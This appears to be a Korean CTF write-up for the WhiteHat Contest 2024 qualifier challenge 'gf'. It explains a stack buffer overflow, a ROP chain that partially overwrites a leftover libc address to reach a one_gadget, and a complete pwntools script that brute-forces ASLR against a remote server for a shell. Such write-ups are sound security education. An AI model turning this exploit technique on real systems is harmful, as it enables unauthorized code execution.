+++
title = "WhiteHat Contest 2024 Quals - gf"
date = "2024-11-19"
description = "WhiteHat Contest 2024 Quals pwnable challenge"

[taxonomies]
tags = ["ctf", "pwnable", "rop", "partial overwrite", "one gadget", "brute force"]
+++

## 0x00. Introduction
``` bash
[*] '/home/user/gf'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```
가젯 이리 저리 조합하다가 매몰되어버린 문제.

종료 20분 전에 알아버렸다...

## 0x01. Vulnerability
``` c
__int64 __fastcall main(int a1, char **a2, char **a3)
{
  char dest[16]; // [rsp+10h] [rbp-10h] BYREF

  setbuf_4011A5();
  read(0, &unk_404060, 0xBCuLL);
  memcpy(dest, &unk_404060, 0xBBuLL);
  return 1LL;
}
```
16바이트 `dest`에 0xbc만큼 입력을 받는 단순한 BOF 취약점이 발생한다.

## 0x02. Exploit
출력 함수는 커녕 ROP를 하기 위한 가젯이 하나도 없다.

그러다가 메모리를 보고 힌트를 얻었다.
``` bash
gef➤  x/4gx $rsp + 0xb0
0x7fffffffed00: 0x0000000000000000      0x0000000000000000
0x7fffffffed10: 0x0000000000000000      0x00007ffff7000000
```
`read()`의 마지막 부분인 `dest + 0xb8` 근처를 보면 매우 수상하게 libc 주소의 일부가 있다.

하위 3바이트가 `0x00`으로 되어있는데, 딱 이 부분까지 쓸 수 있다. 
``` bash
gef➤  x/4gx $rsp + 0xb0
0x7fffffffed00: 0x4141414141414141      0x4141414141414141
0x7fffffffed10: 0x4141414141414141      0x00007ffff7434241
```
따라서 libc leak 없이 이 부분을 이용해서 예상되는 one shot 가젯 주소를 만들어두고 ASLR에 의해 확률적으로 해당 주소에 진짜 one shot 가젯이 로드되길 기대하는 방법이 있다.

`main()`에서 return을 할 때의 레지스터 값들은 다음과 같다.
``` bash
$rax   : 0x1
$rbx   : 0x0
$rcx   : 0x0000000000404060  →  "AAAAAAAAAAAAAAAA\n"
$rdx   : 0xbb
$rsp   : 0x00007fffffffec98  →  0x0000000000000000
$rbp   : 0xa
$rsi   : 0x0000000000404060  →  "AAAAAAAAAAAAAAAA\n"
$rdi   : 0x00007fffffffec80  →  "AAAAAAAAAAAAAAAA\n"
$rip   : 0x0000000000401281  →   ret
$r8    : 0x00007ffff7fabf10  →  0x0000000000000004
$r9    : 0x00007ffff7fc9040  →  0xe5894855fa1e0ff3
$r10   : 0x00007ffff7fc3908  →  0x000d00120000000e
$r11   : 0x246
$r12   : 0x00007fffffffeda8  →  0x00007fffffffef5c  →  0x3d48544150006667 ("gf"?)
$r13   : 0x000000000040122a  →   endbr64
$r14   : 0x0000000000403dc0  →  0x0000000000401160  →   endbr64
$r15   : 0x00007ffff7ffd040  →  0x00007ffff7ffe2e0  →  0x0000000000000000
```
이 상태에서 one shot 가젯 조건을 맞춰줘야하는데 가젯만 몇 시간을 봤더니 바로 방법이 떠올랐다.
``` bash
➜  one_gadget libc.so.6
...
0xebc88 execve("/bin/sh", rsi, rdx)
constraints:
  address rbp-0x78 is writable
  [rsi] == NULL || rsi == NULL || rsi is a valid argv
  [rdx] == NULL || rdx == NULL || rdx is a valid envp
...
```
One shot 가젯 중 위와 같이 `rsi`, `rdx`에 조건이 걸려있는 가젯이 있었고 바이너리에 있는 가젯중 다음과 같은 것들이 있다.
``` bash
➜  objdump -M intel -d gf
...
# shift_rsi_ret gadget
  40112c:       48 89 f0                mov    rax,rsi
  40112f:       48 c1 ee 3f             shr    rsi,0x3f
  401133:       48 c1 f8 03             sar    rax,0x3
  401137:       48 01 c6                add    rsi,rax
  40113a:       48 d1 fe                sar    rsi,1
  40113d:       74 11                   je     401150 <setvbuf@plt+0xb0>
  40113f:       b8 00 00 00 00          mov    eax,0x0
  401144:       48 85 c0                test   rax,rax
  401147:       74 07                   je     401150 <setvbuf@plt+0xb0>
  401149:       bf 10 40 40 00          mov    edi,0x404010
  40114e:       ff e0                   jmp    rax
  401150:       c3                      ret
...
# pop_rsi_pop_rdx_push_rsi_ret gadget
  40119e:       5e                      pop    rsi
  40119f:       5a                      pop    rdx
  4011a0:       56                      push   rsi
  4011a1:       c3                      ret
```
우선 `rdx`는 `pop_rsi_pop_rdx_push_rsi_ret` 가젯을 통해 컨트롤이 가능하고 어떤 의도인지는 모르겠으나 `shift_rsi_ret` 가젯을 통해 `rsi`를 0.5바이트씩 right shift 할 수 있다.

`rsi`에는 `0x404060`가 저장되어있으므로 `shift_rsi_ret` 가젯을 6번 호출하면 `rsi`를 `0`으로 만들 수 있다.

추가로 `rbp-0x78`가 writable 해야하는 조건이 있는데 대충 Data 영역의 중간인 `0x404800`으로 설정해주었다.

확률을 계산해보면 `0x7ffff7XXXc88`가 실제로 one shot 가젯의 주소여야하므로 1.5바이트, 즉 1/4096 확률로 exploit이 성공한다.

그런데 예선이 끝나고 다른 분의 exploit을 보니 100% exploit에 성공할 수 있는 방법이 있었다.

몰랐던 내용이기도 하고 일반적으로 사용할 수 있을 것 같아서 따로 포스팅하겠다.

## 0x03. Payload
``` python
from pwn import *
from pwnlib.util.packing import p32, p64, u32, u64
from time import sleep
from argparse import ArgumentParser

BINARY = "gf"
LIBRARY = "libc.so.6"
CONTAINER = "5189692c7e21"
bp = {
    'main_ret' : 0x401281,
}

gs = f'''
b *{bp["main_ret"]}
continue
'''
context.terminal = ['tmux', 'splitw', '-hf']

def main(server, port, debug):
    if(port):
        # s = remote(server, port)
        if debug:
            pid = os.popen(f"sudo docker top {CONTAINER} -eo pid,comm | grep {BINARY} | awk '{{print $1}}'").read()
            gdb.attach(int(pid), gs, exe=BINARY)
    else:
        s = process(BINARY, env={"LD_PRELOAD" : LIBRARY})
        if debug:
            gdb.attach(s, gs)
    elf = ELF(BINARY)
    lib = ELF(LIBRARY)

    shift_rsi_ret = 0x40112c
    pop_rsi_pop_rdx_push_rsi_ret = 0x40119e

    payload = b"A" * 0x10
    payload += p64(0x404800)
    payload += p64(pop_rsi_pop_rdx_push_rsi_ret)
    payload += p64(shift_rsi_ret)
    payload += p64(0)
    payload += p64(shift_rsi_ret) * 5
    payload += p64(bp['main_ret']) * ((0xb8 - len(payload)) // 8)
    payload += b"\x88\xac\x4b"      # 0x754c18 4b ac 88

    while 1:
        s = remote(server, port)
        s.sendline(payload)
        try:
            sleep(0.2)
            s.sendline(b"id")
            r = s.recvline(timeout=1)
            if b"(pwn)" in r:
                log.success(f"id : {r}")
                s.interactive()
                s.close()
            else:
                log.info(r)
        except Exception as e:
            log.failure(e)
            s.close()

if __name__=='__main__':
    parser = ArgumentParser()
    parser.add_argument('-s', '--server', type=str, default="0.0.0.0")
    parser.add_argument('-p', '--port', type=int)
    parser.add_argument('-d', '--debug', type=int, default=1)
    args = parser.parse_args()
    main(args.server, args.port, args.debug)
```